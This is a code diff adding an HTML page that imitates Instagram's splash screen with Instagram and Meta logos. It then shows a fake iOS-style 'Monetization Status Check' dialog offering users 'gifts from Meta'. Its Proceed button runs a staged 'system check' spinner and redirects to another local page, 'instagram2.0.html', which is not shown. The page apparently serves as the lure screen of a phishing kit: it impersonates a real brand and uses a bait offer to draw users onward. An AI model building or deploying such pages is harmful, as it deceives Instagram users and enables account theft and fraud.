@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Splash Screen</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+            height: 100vh;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            padding-bottom: 55px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* SCREEN 1: SPLASH SCREEN WRAPPER */
+        .splash-screen {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+            padding-bottom: 55px;
+            z-index: 10;
+            opacity: 0; 
+            transition: opacity 0.5s ease;
+        }
+
+        /* Center Section */
+        .main-logo-container {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .instagram-img {
+            width: 72px;
+            height: auto;
+            display: block;
+        }
+
+        /* Bottom Section */
+        .footer-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .text-from {
+            color: #737373;
+            font-size: 13px;
+            letter-spacing: 0.5px;
+            font-weight: 400;
+        }
+
+        .meta-img {
+            width: 78px;
+            height: auto;
+            display: block;
+        }
+
+
+        /* SCREEN 2: POPUP DIALOG WRAPPER */
+        .dialog-screen {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #1a1a1a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 5;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.4s ease, visibility 0.4s ease;
+        }
+
+        /* Active State to Trigger Show */
+        .dialog-screen.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        /* iOS-style Dialog Box */
+        .dialog-box {
+            background-color: rgba(255, 255, 255, 0.95);
+            width: 270px;
+            border-radius: 14px;
+            display: flex;
+            flex-direction: column;
+            text-align: center;
+            box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            transform: scale(0.9);
+            transition: transform 0.3s cubic-bezier(0.1, 0.8, 0.3, 1);
+        }
+
+        .dialog-screen.active .dialog-box {
+            transform: scale(1);
+        }
+
+        /* Content Section */
+        .dialog-content {
+            padding: 20px 16px;
+        }
+
+        .dialog-title {
+            color: #000000;
+            font-size: 17px;
+            font-weight: 600;
+            margin-bottom: 6px;
+        }
+
+        .dialog-message {
+            color: #000000;
+            font-size: 13px;
+            line-height: 16px;
+            font-weight: 400;
+        }
+
+        /* Action Button Layout */
+        .dialog-buttons {
+            display: flex;
+            border-top: 0.5px solid #d1d1d6;
+        }
+
+        .dialog-btn {
+            flex: 1;
+            background: none;
+            border: none;
+            padding: 12px 0;
+            font-size: 16px;
+            font-family: inherit;
+            cursor: pointer;
+            outline: none;
+            text-decoration: none;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #007aff; 
+            font-weight: 600;
+            position: relative;
+            min-height: 44px;
+        }
+
+        .dialog-btn:active {
+            background-color: rgba(0, 0, 0, 0.05);
+            border-bottom-left-radius: 14px;
+            border-bottom-right-radius: 14px;
+        }
+
+        /* Native-style CSS Loading Spinner inside Button */
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(0, 122, 255, 0.2);
+            border-radius: 50%;
+            border-top-color: #007aff;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- SCREEN 1: SPLASH LOADING PAGE -->
+    <div class="splash-screen" id="splashPage">
+        <div class="main-logo-container">
+            <img class="instagram-img" src="instagram logo.jpg" alt="Instagram Logo" id="instPic">
+        </div>
+        <div class="footer-container">
+            <span class="text-from">from</span>
+            <img class="meta-img" src="meta logo.png" alt="Meta Logo" id="metaPic">
+        </div>
+    </div>
+
+    <!-- SCREEN 2: ELIGIBILITY CHECK POPUP PAGE -->
+    <div class="dialog-screen" id="dialogPage">
+        <div class="dialog-box">
+            <div class="dialog-content">
+                <h1 class="dialog-title">Monetization Status Check</h1>
+                <p class="dialog-message">Check if your Instagram profile meets the eligibility to receive gifts from Meta.</p>
+            </div>
+            <div class="dialog-buttons">
+                <button class="dialog-btn" id="proceedBtn" onclick="handleProceed()">
+                    <span id="btnText">Proceed</span>
+                    <div class="spinner" id="btnSpinner"></div>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const splash = document.getElementById('splashPage');
+        const dialogScreen = document.getElementById('dialogPage');
+        const img1 = document.getElementById('instPic');
+        const img2 = document.getElementById('metaPic');
+
+        let loadedCount = 0;
+        function handleImageLoad() {
+            loadedCount++;
+            if (loadedCount >= 2) {
+                initSplashSequence();
+            }
+        }
+
+        if (img1.complete) handleImageLoad(); else img1.addEventListener('load', handleImageLoad);
+        if (img2.complete) handleImageLoad(); else img2.addEventListener('load', handleImageLoad);
+
+        // Backup safety initiation timer
+        setTimeout(() => {
+            if (loadedCount < 2) initSplashSequence();
+        }, 400);
+
+        function initSplashSequence() {
+            splash.style.opacity = '1';
+            
+            setTimeout(() => {
+                splash.style.opacity = '0';
+                setTimeout(() => {
+                    splash.style.display = 'none';
+                    dialogScreen.classList.add('active');
+                }, 500);
+            }, 3000);
+        }
+
+        // Handles professional loading state and dynamic file execution
+        function handleProceed() {
+            const btnText = document.getElementById('btnText');
+            const btnSpinner = document.getElementById('btnSpinner');
+            const proceedBtn = document.getElementById('proceedBtn');
+
+            // Disable button actions during system check simulation
+            proceedBtn.style.pointerEvents = 'none';
+            btnText.style.display = 'none';
+            btnSpinner.style.display = 'block';
+
+            // Seamlessly transfer page control to your destination document file
+            setTimeout(() => {
+                window.location.href = "instagram2.0.html";
+            }, 1200); 
+        }
+    </script>
+
+</body>
+</html>
